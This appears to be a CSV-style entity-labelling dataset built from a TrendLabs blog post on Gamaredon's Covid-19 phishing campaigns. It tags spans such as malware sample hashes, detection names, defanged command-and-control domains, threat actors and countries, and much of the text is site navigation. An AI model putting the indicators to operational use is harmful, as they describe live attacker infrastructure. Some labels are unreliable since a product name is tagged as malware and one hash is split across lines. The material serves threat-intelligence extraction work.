Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," Trojan.W97M.CVE2

DOT file
SHA256 Detection Name TrendX
",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"00b761bce25594da4c760574d224589daf01086c5637042982767a13a2f61bea Mal_OLEMAL-4

Downloader.VBA.TRX.XXVBAF01FF00
7

",ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,250b09f87fe506fbc6cedf9dbfcb594f7795ed0e02f982b5837334f09e8a184b,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog, ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Mal_OLEMAL-4,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"
",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,4b3ae36b04d6aba70089cb2099e6bc1ba16d16ea24bbf09992f23260151b9faf,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog, ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Mal_OLEMAL-4,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"
",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,946405e2f26e1cc0bd22bc7e12d403da939f02e9c4d8ddd012f049cf4bf1fda9,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog, ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Mal_OLEMAL-4,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"
",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,9cd5fa89d579a664c28da16064057096a5703773cef0a079f228f21a4b7fd5d2,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog, ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Mal_OLEMAL-4,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"
",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,c089ccd376c9a4d5e5bdd553181ab4821d2c26fefc299cce7a4f023a660484d5,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog, ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Mal_OLEMAL-4,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,e888b5e657b41d45ef0b2ed939e27ff9ea3a11c46946e31372cf26d92361c012 ,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,W97M_VBSDOWNLDR.ZKHC-A,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,f577d2b97963b717981c01b535f257e03688ff4a918aa66352aa9cd31845b67d ,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,W97M_VBSDOWNLDR.ZYHC-A,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

https://www.trendmicro.com/us/business/complete-user-protection/index.html
https://www.trendmicro.com/us/small-business/product-security/
https://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/
https://www.trendmicro.com/us/small-business/hosted-email-security/
https://www.trendmicro.com/us/business/saas/cloud-app-security/office-365/index.html
https://www.trendmicro.com/us/enterprise/product-security/officescan/
https://www.trendmicro.com/us/business/xgen/index.html
https://www.trendmicro.com/en_us/business/products/detection-response/xdr.html
https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/Trojan.XML.PHISH.AE
https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/W97M_VBSDOWNLDR.ZYHC-A


4/27/2020 ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog

https://blog.trendmicro.com/trendlabs-security-intelligence/",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"-apt-group-use-covid-19-lure-in-campaigns/?fbclid=IwAR2SzsXuDFjCsID7AdOyoE_U… 5/7

SHA256 Detection Name ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,TrendX,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"
17161e0ab3907f637c2202a384de67fca49171c
79b1b24db7c78a4680637e3d5

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Trojan.X97M.CVE20171,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"
1882.THCOCBO

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Downloader.VBA.TRX,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"
.XXVBAF01FF006

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,29367502e16bf1e2b788705014d0142d8bcb7fcc6a47d56fb82d7e333454e923,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,TrojanSpy.Win32.FAREIT.UHBAZCLIZ N/A,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,315e297ac510f3f2a60176f9c12fcf92681bbad758135767ba805cdea830b9ee,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Trojan.X97M.CVE20171,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"
1882.THCOCBO

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Downloader.VBA.TRX.XXVBAF01FF006,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,3e6166a6961bc7c23d316ea9bca87d8287a4044865c3e73064054e805ef5ca1a,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Backdoor.Win32.REMCOS.USMANEAGFG,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Troj.Win32.TRX.XXPE50FFF034,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,3f40d4a0d0fe1eea58fa1c71308431b5c2ce6e381cacc7291e501f4eed57bfd2,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Trojan.MSIL.AGENTTESLA.THCOCBO N/A,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,ab533d6ca0c2be8860a0f7fbfc7820ffd595edc63e540ff4c5991808da6a257d,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Trojan.X97M.CVE201711882.THCOCBO N/A,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,b78a3d21325d3db7470fbf1a6d254e23d349531fca4d7f458b33ca93c91e61cd,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Backdoor.Win32.REMCOS.USMANEAGFE,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Troj.Win32.TRX.XXPE50FFF034,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,c9c0180eba2a712f1aba1303b90cbf12c1117451ce13b68715931abc437b10cd,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,TrojanSpy.Win32.FAREIT.UHBAZCLIZ,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Troj.Win32.TRX.XXPE50FFF034,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

C&C addresses

Bambinos[.]bounceme[.]net
bbtt[.]site
bbtt[.]space
harpa[.]site
harpa[.]space
harpa[.]website
himym[.]site
kristoffer[.]hopto[.]org
kristom[.]hopto[.]org
miragena[.]site
miragena[.]xyz
papir[.]hopto[.]org
sabdja[.]3utilities[.]com
sakira[.]3utilities[.]com
seliconos[.]3utilities[.]com
solod[.]bounceme[.]net
sonik[.]hopto[.]org
tele[.]3utilities[.]com
violina[.]website
voyager[.]myftp[.]biz
voyaget[.]myftp[.]biz

Mitre ATT&CK Framework

Related Posts:

Operation ENDTRADE: Finding Multi-Stage Backdoors that TICK
Spam Campaign Targets Colombian Entities with Custom-made ‘",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Proyecto RAT,malware
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,",’ Uses Email Service YOPmail for C&C
Mac Backdoor Linked to ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Lazarus,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," Targets Korean Users
Outlaw Updates Kit to Kill Older Miner Versions, Targets More Systems

Learn how to protect Enterprises, Small Businesses, and Home Users from ransomware:

ENTERPRISE SMALL BUSINESS HOME

Tags: APT

» » »

https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/TrojanSpy.Win32.FAREIT.UHBAZCLIZ
https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/Backdoor.Win32.REMCOS.USMANEAGFG
https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/Trojan.MSIL.AGENTTESLA.THCOCBO
https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/TrojanSpy.Win32.FAREIT.UHBAZCLIZ
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/04/mitre.jpg
https://blog.trendmicro.com/trendlabs-security-intelligence/operation-endtrade-finding-multi-stage-backdoors-that-tick/
https://blog.trendmicro.com/trendlabs-security-intelligence/spam-campaign-targets-colombian-entities-with-custom-proyecto-rat-email-service-yopmail-for-cc/
https://blog.trendmicro.com/trendlabs-security-intelligence/mac-backdoor-linked-to-lazarus-targets-korean-users/
https://blog.trendmicro.com/trendlabs-security-intelligence/outlaw-updates-kit-to-kill-older-miner-versions-targets-more-systems/
http://www.trendmicro.com/us/security-intelligence/enterprise-ransomware/index.html
http://www.trendmicro.com/us/security-intelligence/small-business-ransomware/index.html
http://www.trendmicro.com/us/home/consumer-ransomware/index.html
https://blog.trendmicro.com/trendlabs-security-intelligence/tag/apt/


4/27/2020 ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog

https://blog.trendmicro.com/trendlabs-security-intelligence/Gamaredon-apt-group-use-covid-19-lure-in-campaigns/?fbclid=IwAR2SzsXuDFjCsID7AdOyoE_U… 6/7

Security Predictions for 2020

Cybersecurity in 2020 will be viewed through many lenses — from differing attacker motivations and cybercriminal arsenal to technological developments and
global threat intelligence — only so defenders can keep up with the broad range of threats.
Read our security predictions for 2020.

Business Process Compromise

Attackers are starting to invest in long-term operations that target specific processes enterprises rely on. They scout for vulnerable practices, susceptible
systems and operational loopholes that they can leverage or abuse. To learn more, read our Security 101: Business Process Compromise.

Recent Posts

Exposed Redis Instances Abused for Remote Code Execution, Cryptocurrency Mining
Grouping Linux IoT Malware Samples With ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Trend Micro,org
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," ELF Hash
",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," APT Group Use Covid-19 Lure in Campaigns
Exposing Modular Adware: How DealPly, IsErIk, and ManageX Persist in Systems
April Patch Tuesday: Fixes for Font-Related, Microsoft SharePoint, Windows Components Vulnerabilities

Popular Posts

More Than 8,000 Unsecured Redis Instances Found in the Cloud

Raccoon Stealer’s Abuse of Google Cloud Services and Multiple Delivery Techniques

Dissecting Geost: Exposing the Anatomy of the Android Trojan Targeting Russian Banks

Operation ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Poisoned News,campaign
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,": Hong Kong Users Targeted With Mobile Malware via Local News Links

Coronavirus Update App Leads to Project Spy Android and iOS Spyware

Stay Updated

Email Subscription
Your email here

Subscribe

Home and Home Office
|
For Business
|
Security Intelligence
|
About ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Trend Micro,org
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

Asia Pacific Region (APAC): ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Australia,country
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog, / ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,New Zealand,country
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,", 中国, ⽇本, 대한민국, 台灣
Latin America Region (LAR): ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Brasil,country
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,", México
North America Region (NABU): ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,United States,country
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,", ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Canada,country
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," 
Europe, Middle East, & Africa Region (EMEA): ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,France,country
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,", ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Deutschland,country
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog, / Österreich / ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Schweiz,country
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,", ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Italia,country
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,", Россия, España, ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,United Kingdom,country
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog, / ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Ireland,country
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

0 Comments TrendLabs 🔒 Privacy Policy Login1

t Tweet f Share Sort by Best

LOG IN WITH OR SIGN UP WITH DISQUS 

Name

Start the discussion…

?

Be the first to comment.

Subscribe✉ Add Disqus to your siteAdd DisqusAddd
D N t S ll M D t⚠

 Recommend

https://www.trendmicro.com/vinfo/us/security/research-and-analysis/predictions/2020
https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/security-101-business-process-compromise
https://blog.trendmicro.com/trendlabs-security-intelligence/exposed-redis-instances-abused-for-remote-code-execution-cryptocurrency-mining/
https://blog.trendmicro.com/trendlabs-security-intelligence/grouping-linux-iot-malware-samples-with-trend-micro-elf-hash/
https://blog.trendmicro.com/trendlabs-security-intelligence/",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"-apt-group-use-covid-19-lure-in-campaigns/
https://blog.trendmicro.com/trendlabs-security-intelligence/exposing-modular-adware-how-dealply-iserik-and-managex-persist-in-systems/
https://blog.trendmicro.com/trendlabs-security-intelligence/april-patch-tuesday-fixes-for-font-related-microsoft-sharepoint-windows-components-vulnerabilities/
https://blog.trendmicro.com/trendlabs-security-intelligence/more-than-8000-unsecured-redis-instances-found-in-the-cloud/
https://blog.trendmicro.com/trendlabs-security-intelligence/raccoon-stealers-abuse-of-google-cloud-services-and-multiple-delivery-techniques/
https://blog.trendmicro.com/trendlabs-security-intelligence/dissecting-geost-exposing-the-anatomy-of-the-android-trojan-targeting-russian-banks/
https://blog.trendmicro.com/trendlabs-security-intelligence/operation-poisoned-news-hong-kong-users-targeted-with-mobile-malware-via-local-news-links/
https://blog.trendmicro.com/trendlabs-security-intelligence/coronavirus-update-app-leads-to-project-spy-android-and-ios-spyware/
http://www.trendmicro.com/us/home/index.html
http://www.trendmicro.com/us/business/index.html
http://www.trendmicro.com/us/security-intelligence/index.html
http://www.trendmicro.com/us/about-us/index.html
http://www.trendmicro.com.au/au/home/index.html
http://www.trendmicro.co.nz/nz/home/index.html
http://cn.trendmicro.com/cn/home/index.html
http://jp.trendmicro.com/jp/home/index.html
http://www.trendmicro.co.kr/index.html
http://tw.trendmicro.com/tw/home/index.html
http://br.trendmicro.com/br/home/index.html
http://la.trendmicro.com/la/home/index.html
http://www.trendmicro.com/us/index.html
http://ca.trendmicro.com/ca/home/index.html
http://www.trendmicro.fr/
http://www.trendmicro.de/
http://www.trendmicro.it/
http://www.trendmicro.com.ru/
http://www.trendmicro.es/
http://www.trendmicro.co.uk/
https://disqus.com/
https://disqus.com/home/forums/trendlabs/
https://help.disqus.com/customer/portal/articles/466259-privacy-policy
https://disqus.com/home/inbox/
https://publishers.disqus.com/engage?utm_source=trendlabs&utm_medium=Disqus-Footer
https://disqus.com/data-sharing-settings/


4/27/2020 ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog

https://blog.trendmicro.com/trendlabs-security-intelligence/Gamaredon-apt-group-use-covid-19-lure-in-campaigns/?fbclid=IwAR2SzsXuDFjCsID7AdOyoE_U… 7/7

Privacy Statement
Legal Policies

Copyright © 2020 ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Trend Micro,org
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," Incorporated. All rights reserved.

http://www.trendmicro.com/us/about-us/legal-policies/privacy-statement/index.html
http://www.trendmicro.com/us/about-us/legal-policies/index.html",O
